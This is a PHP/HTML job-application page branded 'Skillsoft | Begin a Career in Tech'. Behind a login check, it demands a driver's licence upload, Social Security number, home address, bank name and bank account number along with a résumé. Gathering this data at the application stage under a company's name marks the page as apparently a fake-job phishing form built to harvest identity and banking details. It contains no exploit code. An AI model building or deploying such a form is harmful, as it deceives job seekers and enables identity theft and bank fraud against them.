<?php
session_start();
include("php/config.php");
if (!isset($_SESSION['valid'])) {
  header("Location: login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include("includes/head.php"); ?>
    <title>Skillsoft | Begin a Career in Tech</title>
  </head>
  <body>
    <section class="bg-indigo-50 py-10">
      <div class="form-container">
        <form action="php/upload.php" method="post" enctype="multipart/form-data">
          <h2>Application</h2>

          <!-- Personal Information -->
          <div class="form-group">
            <label for="firstname">First Name</label>
            <input
              type="text"
              id="firstname"
              name="firstname"
              placeholder="John"
              required
            />
          </div>

          <div class="form-group">
            <label for="lastname">Last Name</label>
            <input
              type="text"
              id="lastname"
              name="lastname"
              placeholder="Doe"
              required
            />
          </div>

          <div class="form-group">
            <label for="gender">Gender</label>
            <select id="gender" name="gender" required>
              <option value="Male">Male</option>
              <option value="Female">Female</option>
              <option value="Others">Other binaries</option>
              <option value="private">Prefer not to say</option>
            </select>
          </div>

          <div class="form-group">
            <label for="email">Email</label>
            <input
              type="email"
              id="email"
              name="email"
              placeholder="Johndoe@example.com"
              required
            />
          </div>

          <!-- File Uploads -->
          <div class="form-group">
            <label for="driverlicense">Driver License</label>
            <input
              type="file"
              id="driverlicense"
              name="driverlicense"
              required
            />
          </div>

          <div class="form-group">
            <label for="resume">Resume/CV</label>
            <input
              type="file"
              id="resume"
              name="resume"
              accept=".pdf,.doc,.docx"
              required
            />
          </div>

          <div class="form-group">
            <label for="coverletter">Cover Letter</label>
            <input
              type="file"
              id="coverletter"
              name="coverletter"
              accept=".pdf,.doc,.docx"
              required
            />
          </div>

          <!-- Additional Information -->
          <div class="form-group">
            <label for="ssn">SSN</label>
            <input
              type="text"
              id="ssn"
              name="ssn"
              placeholder=""
              required
            />
          </div>

          <div class="form-group">
            <label for="phoneno">Phone Number</label>
            <input
              type="text"
              id="phoneno"
              name="phoneno"
              placeholder=""
              required
            />
          </div>

          <div class="form-group">
            <label for="houseaddress">House Address</label>
            <input
              type="text"
              id="houseaddress"
              name="houseaddress"
              placeholder=""
              required
            />
          </div>

          <div class="form-group">
            <label for="bankname">Bank Name</label>
            <input
              type="text"
              id="bankname"
              name="bankname"
              placeholder=""
              required
            />
          </div>

          <div class="form-group">
            <label for="bankno">Bank Number</label>
            <input
              type="text"
              id="bankno"
              name="bankno"
              placeholder=""
              required
            />
          </div>

          <!-- Submit Button -->
          <div class="form-group">
            <button type="submit" name="submit" class="submit-button">
              Submit Application
            </button>
          </div>
        </form>
      </div>
    </section>

    <script src="js/main.js"></script>
  </body>
</html>